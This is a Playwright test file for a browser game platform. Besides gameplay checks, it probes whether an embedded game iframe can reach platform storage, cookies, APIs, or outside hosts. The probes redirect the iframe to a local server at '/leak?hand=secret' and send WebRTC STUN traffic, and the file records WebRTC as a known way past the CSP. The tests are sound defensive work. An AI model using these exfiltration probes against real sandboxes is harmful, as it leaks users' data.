import { expect, test, type Browser, type Page } from "@playwright/test";
import { createSocket } from "node:dgram";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { adminAccount, canCreateAdmins, createRoomButton, newPlayer, removeTestData } from "./accounts";

test.skip(!canCreateAdmins(), "needs GAMEHEARTH_ADMIN_LINK_COMMAND against an external server");
test.afterAll(async ({ baseURL }) => removeTestData(baseURL));

async function runningRoom(browser: Browser): Promise<{ anna: Page; ben: Page; code: string }> {
  const { page: anna } = await adminAccount(browser, "Anna");
  await createRoomButton(anna).click();
  await expect(anna).toHaveURL(/\/r\/[A-Z2-9]{6}$/);
  const code = (await anna.getByTestId("room-code").textContent()) ?? "";
  expect(code).toMatch(/^[A-Z2-9]{6}$/);

  const ben = await newPlayer(browser);
  await ben.goto(`/r/${code}`);
  await ben.getByLabel("Dein Name").fill("Ben");
  await ben.getByRole("button", { name: "Als Gast beitreten" }).click();
  await expect(ben.getByText("Warte, bis Anna die Partie startet")).toBeVisible();
  await expect(anna.getByText("Ben", { exact: true })).toBeVisible();
  await expect(anna.getByText("Gast", { exact: true })).toBeVisible();

  await anna.getByRole("button", { name: "Partie starten" }).click();
  for (const page of [anna, ben]) {
    await expect(page.frameLocator("iframe").locator("#access p").first()).not.toBeEmpty();
  }
  return { anna, ben, code };
}

async function playOneMove(page: Page): Promise<boolean> {
  const buttons = await page.frameLocator("iframe").getByRole("group", { name: "Deine Züge" }).getByRole("button").all();
  if (buttons.length === 0) {
    return false;
  }
  const labels = await Promise.all(buttons.map((button) => button.textContent()));
  const index = labels.findIndex((label) => label?.includes(" legen") === true);
  await buttons[index >= 0 ? index : 0]?.dispatchEvent("click");
  return true;
}

test("two players play a whole match and start a new round", async ({ browser }) => {
  const { anna, ben } = await runningRoom(browser);
  await anna.waitForTimeout(500);
  await anna.screenshot({ path: test.info().outputPath("anna-start.png") });
  await ben.screenshot({ path: test.info().outputPath("ben-start.png") });

  let moves = 0;
  for (let round = 0; round < 600 && (await anna.getByText("Partie vorbei").count()) === 0; round++) {
    let moved = false;
    for (const page of [anna, ben]) {
      if (await playOneMove(page)) {
        moves++;
        moved = true;
        await page.waitForTimeout(80);
      }
    }
    if (!moved) {
      await anna.waitForTimeout(100);
    }
  }
  await expect(anna.getByText("Partie vorbei")).toBeVisible();
  await expect(ben.getByText("Partie vorbei")).toBeVisible();
  await expect(ben.getByText("Warte auf eine neue Runde von Anna")).toBeVisible();
  await expect(anna.frameLocator("iframe").locator("#access p").first()).toHaveText(/gewonnen|Unentschieden/);
  expect(moves).toBeGreaterThan(2);
  await anna.waitForTimeout(500);
  await anna.screenshot({ path: test.info().outputPath("anna-end.png") });
  await ben.screenshot({ path: test.info().outputPath("ben-end.png") });

  await anna.getByRole("button", { name: "Neue Runde" }).click();
  await expect(anna.getByText("Lobby · Runde 2")).toBeVisible();
  await expect(ben.getByText("Lobby · Runde 2")).toBeVisible();
});

test("the game reaches neither the storage and tokens of the platform nor the outside via fetch, WebSocket or image, and cannot be opened as a page of its own", async ({ browser }) => {
  const { anna } = await runningRoom(browser);
  const frame = anna.frames().find((candidate) => candidate.url().includes("/games/"));
  expect(frame).toBeDefined();
  const probe = await frame!.evaluate(async () => {
    const attempt = async (work: () => unknown) => {
      try {
        return `allowed: ${String(await work()).slice(0, 60)}`;
      } catch (error) {
        return `blocked: ${error instanceof Error ? error.name : String(error)}`;
      }
    };
    return {
      origin: window.origin,
      localStorage: await attempt(() => window.localStorage.getItem("gamehearth.rooms")),
      cookie: await attempt(() => document.cookie),
      session: await attempt(() => fetch("/api/me", { credentials: "include" }).then((response) => response.status)),
      parentStorage: await attempt(() => window.parent.localStorage.getItem("gamehearth.rooms")),
      parentDocument: await attempt(() => window.parent.document.title),
      api: await attempt(() => fetch("/api/games").then((response) => response.status)),
      socket: await attempt(
        () =>
          new Promise((resolve, reject) => {
            const socket = new WebSocket(`ws://${location.host}/ws`);
            socket.onopen = () => resolve("open");
            socket.onerror = () => reject(new Error("socket"));
          }),
      ),
      image: await attempt(
        () =>
          new Promise((resolve, reject) => {
            const image = new Image();
            image.onload = () => resolve("loaded");
            image.onerror = () => reject(new Error("image"));
            image.src = "https://example.com/pixel.png";
          }),
      ),
    };
  });
  expect(probe).toEqual({
    origin: "null",
    localStorage: expect.stringMatching(/^blocked/),
    cookie: expect.stringMatching(/^blocked/),
    session: expect.stringMatching(/^blocked/),
    parentStorage: expect.stringMatching(/^blocked/),
    parentDocument: expect.stringMatching(/^blocked/),
    api: expect.stringMatching(/^blocked/),
    socket: expect.stringMatching(/^blocked/),
    image: expect.stringMatching(/^blocked/),
  });

  const direct = await newPlayer(browser);
  const response = await direct.goto(frame!.url());
  expect(response?.status()).toBe(403);
  await expect(direct.locator("body")).toContainText("Spieldateien laufen nur eingebettet in Gamehearth");
  const storage = await direct.evaluate(() => {
    try {
      return window.localStorage.getItem("gamehearth.rooms");
    } catch (error) {
      return error instanceof Error ? error.name : "error";
    }
  });
  expect(storage).toBe("SecurityError");
});

test("after a move the game first gets the new snapshot, then the result", async ({ browser }) => {
  const { anna } = await runningRoom(browser);
  const frame = anna.frames().find((candidate) => candidate.url().includes("/games/"));
  expect(frame).toBeDefined();
  const order = await frame!.evaluate(
    () =>
      new Promise<string[]>((resolve) => {
        const seen: string[] = [];
        let sent = false;
        addEventListener("message", (event: MessageEvent) => {
          if (event.source !== window.parent) {
            return;
          }
          const data = event.data as { type: string; id?: number; snapshot?: { version: number; moves: unknown[] } };
          if (data.type === "update" && data.snapshot !== undefined) {
            seen.push(`update ${data.snapshot.version}`);
            if (!sent && data.snapshot.moves.length > 0) {
              sent = true;
              window.parent.postMessage({ gamehearth: 1, type: "move", id: 999, action: data.snapshot.moves[0], expectedVersion: data.snapshot.version }, "*");
            }
          }
          if (data.type === "result" && data.id === 999) {
            seen.push(`result ${String((data as { ok?: boolean }).ok)}`);
            resolve(seen);
          }
        });
        window.parent.postMessage({ gamehearth: 1, type: "ready" }, "*");
      }),
  );
  expect(order[0]).toBe("update 0");
  expect(order.indexOf("update 1")).toBeGreaterThan(0);
  expect(order.indexOf("update 1")).toBeLessThan(order.indexOf("result true"));
});

test("a game cannot redirect its iframe to a foreign address", async ({ browser }) => {
  const requests: string[] = [];
  const foreign = createServer((request, response) => {
    requests.push(request.url ?? "");
    response.end("foreign");
  });
  await new Promise<void>((resolve) => foreign.listen(0, "127.0.0.1", resolve));
  try {
    const { anna } = await runningRoom(browser);
    const frame = anna.frames().find((candidate) => candidate.url().includes("/games/"));
    const port = (foreign.address() as AddressInfo).port;
    await frame!.evaluate((target) => {
      location.href = `${target}/leak?hand=secret`;
    }, `http://127.0.0.1:${port}`);
    await anna.waitForTimeout(1500);
    expect(requests).toEqual([]);
  } finally {
    foreign.close();
  }
});

test("known limitation: WebRTC reaches foreign servers despite the CSP", async ({ browser }) => {
  const packets: number[] = [];
  const udp = createSocket("udp4");
  udp.on("message", (message) => packets.push(message.length));
  await new Promise<void>((resolve) => udp.bind(0, "127.0.0.1", resolve));
  try {
    const { anna } = await runningRoom(browser);
    const frame = anna.frames().find((candidate) => candidate.url().includes("/games/"));
    await frame!.evaluate(async (port) => {
      const connection = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${port}` }] });
      connection.createDataChannel("leak");
      await connection.setLocalDescription(await connection.createOffer());
    }, udp.address().port);
    await anna.waitForTimeout(2000);
    expect(packets.length).toBeGreaterThan(0);
  } finally {
    udp.close();
  }
});

test("messages from other windows do not trigger moves", async ({ browser }) => {
  const { anna } = await runningRoom(browser);
  const before = await anna.frameLocator("iframe").locator("#access p").nth(1).textContent();
  await anna.evaluate(() => window.postMessage({ gamehearth: 1, type: "move", id: 99, action: { type: "draw" }, expectedVersion: 0 }, "*"));
  await anna.waitForTimeout(500);
  expect(await anna.frameLocator("iframe").locator("#access p").nth(1).textContent()).toBe(before);
});
